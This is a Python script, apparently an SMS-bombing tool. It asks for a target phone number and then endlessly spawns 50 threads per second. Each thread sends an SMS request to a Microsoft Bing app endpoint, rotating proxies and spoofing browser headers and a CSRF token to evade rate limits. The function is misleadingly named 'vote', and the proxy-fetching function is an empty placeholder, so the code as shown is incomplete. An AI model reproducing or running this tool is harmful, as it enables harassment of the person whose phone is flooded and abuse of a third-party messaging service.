import requests
import json
import threading
import time
import random
import logging

phone_number = input("Enter phone number: ")

logging.basicConfig(filename='log.log', filemode='a', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def get_proxies():
    # ... (existing code for getting proxies)

def vote(proxy):
    headers = {
        'authority': 'bingapp.microsoft.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://bingapp.microsoft.com',
        'referer': 'https://bingapp.microsoft.com/bing?style=rewards',
        'request-id': '|e8076b5dc420496aa09ca9e1fa6d9b4e.f307a21f963845b6',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'traceparent': '00-e8076b5dc420496aa09ca9e1fa6d9b4e-f307a21f963845b6-01',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'x-csrf-token': '3hUD8yhV-LmXnpqxfDipkTcx-T-c6aTzZGC8'
    }

    payload = {
        "_csrf": "3hUD8yhV-LmXnpqxfDipkTcx-T-c6aTzZGC8",
        "code": "bing",
        "number": phone_number,
        "adjust": "hh15fre_vz667pg",
        "style": "rewards",
        "go": "false",
        "url": None,
        "id": None,
        "referId": None,
        "codeTransit": None
    }

    try:
        resp = requests.post("https://bingapp.microsoft.com/api/sms/send",
                             headers=headers,
                             json=payload,
                             proxies={"https": proxy},
                             timeout=15)
        output = resp.text
        if "SMS SENT SUCCESSFULLY!" in output:
            print("SMS SENT SUCCESSFULLY!")
        else:
            print("SMS SEND FAILED.")
    except:
        output = f"Request failed with proxy {proxy}"

    logging.info(output)
    print(output)

num_threads = 50

while True:
    proxies = get_proxies()
    if len(proxies) == 0:
        print("No proxies available, waiting for 10 seconds...")
        time.sleep(10)
        continue
    
    for i in range(num_threads):
        proxy = random.choice(proxies)
        t = threading.Thread(target=vote, args=(proxy,))
        t.start()
    
    time.sleep(1)
